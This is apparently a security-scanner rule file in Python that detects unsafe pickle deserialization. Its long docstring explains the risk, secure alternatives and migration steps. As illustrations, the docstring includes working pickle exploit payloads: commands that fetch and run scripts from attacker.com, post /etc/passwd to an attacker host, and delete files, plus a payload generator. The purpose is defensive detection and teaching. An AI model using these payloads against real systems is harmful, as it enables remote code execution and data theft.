"""
PYTHON-DESER-001: Unsafe Pickle Deserialization

Security Impact: CRITICAL
CWE: CWE-502 (Deserialization of Untrusted Data)
CVE: CVE-2021-3177 (Python Buffer Overflow via crafted pickle data)
OWASP: A08:2021 - Software and Data Integrity Failures

DESCRIPTION:
This rule detects unsafe pickle deserialization where untrusted user input flows directly
to pickle.loads() or pickle.load(). Pickle is Python's binary serialization format that can
execute arbitrary code during deserialization, making it extremely dangerous when used with
untrusted data.

WHAT IS PICKLE DESERIALIZATION:

Python's pickle module serializes (pickles) and deserializes (unpickles) Python objects.
Unlike JSON, pickle can serialize ANY Python object, including:
- Functions and classes
- Object instances with custom __reduce__ methods
- Arbitrary bytecode

**The Problem**: During unpickling, pickle can execute arbitrary Python code by design.
This is not a bug - it's a feature that becomes a critical vulnerability with untrusted input.

SECURITY IMPLICATIONS:

**1. Remote Code Execution (RCE)**:
An attacker can craft a malicious pickle payload that executes arbitrary code when unpickled:

```python
import pickle
import os

# Malicious pickle payload
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/backdoor.sh | bash',))

# Serialized payload
malicious_data = pickle.dumps(Exploit())

# When victim unpickles this, it executes the command!
pickle.loads(malicious_data)  # RCE!
```

**2. System Compromise**:
Attackers can:
- Execute shell commands
- Read/write files
- Steal credentials
- Install backdoors
- Modify system configuration
- Establish persistence

**3. Data Exfiltration**:
```python
class DataExfil:
    def __reduce__(self):
        cmd = 'curl -X POST --data @/etc/passwd attacker.com/collect'
        return (os.system, (cmd,))
```

**4. Denial of Service**:
- Crash the application
- Consume all memory (billion laughs attack)
- Fork bomb attacks

VULNERABLE EXAMPLE:
```python
import pickle
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/load_data', methods=['POST'])
def load_user_data():
    \"\"\"
    CRITICAL VULNERABILITY: Deserializing untrusted pickle data!
    \"\"\"
    # Source: User-controlled input
    serialized_data = request.data

    # Sink: Unsafe deserialization
    user_data = pickle.loads(serialized_data)  # RCE here!

    return {'data': user_data}

# Attack:
# POST /api/load_data
# Body: <malicious pickle payload>
# Result: Arbitrary code execution on server
```

**Creating malicious payload**:
```python
import pickle
import os
import base64

class RCE:
    def __reduce__(self):
        # Execute: curl attacker.com/shell | bash
        cmd = 'curl attacker.com/shell.sh | bash'
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
# Send this to vulnerable endpoint
```

SECURE EXAMPLE:
```python
import json
from flask import Flask, request
import hmac
import hashlib

app = Flask(__name__)
SECRET_KEY = 'your-secret-key-here'

@app.route('/api/load_data', methods=['POST'])
def load_user_data():
    \"\"\"
    SECURE: Use JSON for untrusted data, not pickle!
    \"\"\"
    try:
        # Use JSON instead of pickle
        user_data = json.loads(request.data)
        return {'data': user_data}
    except json.JSONDecodeError:
        return {'error': 'Invalid JSON'}, 400

# If you MUST use pickle with trusted sources:
@app.route('/api/load_trusted', methods=['POST'])
def load_trusted_data():
    \"\"\"
    LESS UNSAFE: Verify HMAC signature before unpickling.
    Only use this for data you control!
    \"\"\"
    data = request.get_json()
    signed_data = base64.b64decode(data['signed_data'])
    signature = data['signature']

    # Verify HMAC signature
    expected = hmac.new(SECRET_KEY.encode(), signed_data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected):
        return {'error': 'Invalid signature'}, 403

    # Only unpickle if signature is valid
    obj = pickle.loads(signed_data)
    return {'data': str(obj)}
```

ALTERNATIVE SECURE APPROACHES:

**1. Use JSON** (Recommended):
```python
import json

# JSON is safe for untrusted data
data = json.loads(user_input)

# Limitations: Can't serialize custom classes
# But that's a GOOD thing for security!
```

**2. Use MessagePack**:
```python
import msgpack

# Fast binary serialization, safe for untrusted data
data = msgpack.unpackb(user_input)

# More efficient than JSON, still safe
```

**3. Use Protocol Buffers**:
```python
import user_pb2  # Generated from .proto file

user = user_pb2.User()
user.ParseFromString(user_input)

# Type-safe, fast, secure
```

**4. Django Signing**:
```python
from django.core import signing

# Serialize with signature
signed_data = signing.dumps({'user_id': 123})

# Deserialize with signature verification
try:
    data = signing.loads(signed_data)
except signing.BadSignature:
    # Tampered data detected
    pass
```

**5. If you MUST use pickle** (internal use only):
```python
import pickle
import hmac

SECRET = b'your-secret-key'

def safe_pickle_dumps(obj):
    \"\"\"Pickle with HMAC signature.\"\"\"
    data = pickle.dumps(obj)
    sig = hmac.new(SECRET, data, 'sha256').digest()
    return sig + data

def safe_pickle_loads(signed_data):
    \"\"\"Verify HMAC before unpickling.\"\"\"
    sig, data = signed_data[:32], signed_data[32:]
    expected = hmac.new(SECRET, data, 'sha256').digest()

    if not hmac.compare_digest(sig, expected):
        raise ValueError("Invalid signature")

    return pickle.loads(data)

# Still only use with data YOU control!
```

DETECTION AND PREVENTION:

**Pre-deployment checks**:
```bash
# Scan for unsafe pickle usage
pathfinder scan --project . --ruleset cpf/python/PYTHON-DESER-001

# Automated CI/CD:
# .github/workflows/security.yml
- name: Check for unsafe deserialization
  run: pathfinder ci --project . --ruleset cpf/python/deserialization
```

**Code Review Checklist**:
- [ ] No `pickle.loads()` or `pickle.load()` with user input
- [ ] No `_pickle.loads()` with user input
- [ ] Use JSON/MessagePack for untrusted data
- [ ] If pickle required, use HMAC signature verification
- [ ] Never unpickle data from network/external sources
- [ ] Use `json.loads()` as default serialization

**Static Analysis**:
```bash
# Find all pickle.loads usage
grep -rn "pickle.loads" --include="*.py"
grep -rn "pickle.load" --include="*.py"

# Check if input is from untrusted sources
# (request.data, request.POST, user input, etc.)
```

REAL-WORLD ATTACK SCENARIOS:

**1. Web API Attack**:
```python
# Vulnerable endpoint
@app.route('/api/session', methods=['POST'])
def restore_session():
    session_data = pickle.loads(request.data)  # RCE!

# Attack payload:
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('rm -rf /tmp/*',))

payload = pickle.dumps(RCE())
# POST /api/session with payload
```

**2. Cookie Deserialization**:
```python
# Vulnerable cookie handling
cookie = request.cookies.get('session')
session = pickle.loads(base64.b64decode(cookie))  # RCE!

# Attacker sets cookie to malicious payload
```

**3. Redis/Memcache Cache Attack**:
```python
# Vulnerable cache read
cached = redis.get(f'user:{user_id}')
user = pickle.loads(cached)  # RCE if attacker controls Redis!
```

**4. Message Queue Attack**:
```python
# Vulnerable Celery/RabbitMQ
def process_task(serialized_task):
    task = pickle.loads(serialized_task)  # RCE!
    task.execute()
```

COMPLIANCE AND AUDITING:

**OWASP Top 10 A08:2021**:
> "Software and Data Integrity Failures - Insecure Deserialization"

**CWE-502**:
> "Deserialization of Untrusted Data"

**SANS Top 25**:
Insecure Deserialization ranked as critical vulnerability

**NIST SP 800-53**:
SI-10: Information Input Validation

**PCI DSS Requirement 6.5.1**:
> "Injection flaws"

MIGRATION GUIDE:

**Step 1: Find all pickle usage**:
```bash
# Audit codebase
grep -rn "import pickle" --include="*.py"
grep -rn "from pickle" --include="*.py"
```

**Step 2: Replace with JSON**:
```python
# BEFORE
data = pickle.loads(user_input)

# AFTER
data = json.loads(user_input)
```

**Step 3: Handle custom objects**:
```python
# BEFORE (pickle can serialize any object)
user = User(name="Alice", age=30)
serialized = pickle.dumps(user)

# AFTER (use to_dict/from_dict pattern)
class User:
    def to_dict(self):
        return {'name': self.name, 'age': self.age}

    @classmethod
    def from_dict(cls, data):
        return cls(name=data['name'], age=data['age'])

serialized = json.dumps(user.to_dict())
user = User.from_dict(json.loads(serialized))
```

**Step 4: Secure internal pickle usage**:
```python
# If pickle needed for internal use (never user input!)
import pickle
import hmac

def secure_loads(signed_data, secret):
    sig, data = signed_data[:32], signed_data[32:]
    if not hmac.compare_digest(sig, hmac.new(secret, data, 'sha256').digest()):
        raise ValueError("Tampered data")
    return pickle.loads(data)
```

FRAMEWORK-SPECIFIC NOTES:

**Django**:
```python
# Don't use pickle for sessions
# settings.py
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.JSONSerializer'

# NOT this:
# SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'
```

**Flask**:
```python
# Use itsdangerous for signed cookies
from itsdangerous import URLSafeSerializer

s = URLSafeSerializer(secret_key)
signed = s.dumps({'user_id': 123})
data = s.loads(signed)  # Safe!
```

**Celery**:
```python
# Use JSON serializer, not pickle
# celeryconfig.py
task_serializer = 'json'
result_serializer = 'json'
accept_content = ['json']

# NOT:
# task_serializer = 'pickle'
```

REFERENCES:
- CWE-502: Deserialization of Untrusted Data (https://cwe.mitre.org/data/definitions/502.html)
- CVE-2021-3177: Python Buffer Overflow
- OWASP A08:2021 - Software and Data Integrity Failures
- Python Pickle Documentation (Security Warning!)
- Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html

DETECTION SCOPE:
This rule performs intra-procedural analysis only. It detects unsafe pickle deserialization
when both the source (user input) and sink (pickle.loads) are in the same function. It will
NOT detect cases where user input is passed through multiple functions before being pickled.

LIMITATION:
- Only detects flows within a single function (intra-procedural)
- Does not track dataflow across function boundaries (inter-procedural)
- May miss complex multi-function deserialization patterns
"""

from rules.python_decorators import python_rule
from codepathfinder import calls, flows
from codepathfinder.presets import PropagationPresets


@python_rule(
    id="PYTHON-DESER-001",
    name="Unsafe Pickle Deserialization",
    severity="CRITICAL",
    category="deserialization",
    cwe="CWE-502",
    cve="CVE-2021-3177",
    tags="python,deserialization,pickle,rce,untrusted-data,owasp-a08,cwe-502,remote-code-execution,critical,security,intra-procedural",
    message="Unsafe pickle deserialization: Untrusted data flows to pickle.loads() which can execute arbitrary code. Use json.loads() instead.",
    owasp="A08:2021",
)
def detect_pickle_deserialization():
    """
    Detects unsafe pickle deserialization where user input flows to pickle.loads() within a single function.

    LIMITATION: Only detects intra-procedural flows (within one function).
    Will NOT detect if user input is in one function and pickle.loads is in another.

    Example vulnerable code:
        user_data = request.data
        obj = pickle.loads(user_data)  # RCE!
    """
    return flows(
        from_sources=[
            calls("request.data"),
            calls("request.get_data"),
            calls("request.GET"),
            calls("request.POST"),
            calls("request.COOKIES"),
            calls("input"),
            calls("*.data"),
            calls("*.GET"),
            calls("*.POST"),
            calls("*.read"),
            calls("*.recv"),
        ],
        to_sinks=[
            calls("pickle.loads"),
            calls("pickle.load"),
            calls("_pickle.loads"),
            calls("_pickle.load"),
            calls("*.loads"),
            calls("*.load"),
        ],
        sanitized_by=[
            calls("*.validate"),
            calls("*.verify_signature"),
            calls("*.verify"),
            calls("hmac.compare_digest"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="local",  # CRITICAL: Only intra-procedural analysis works
    )
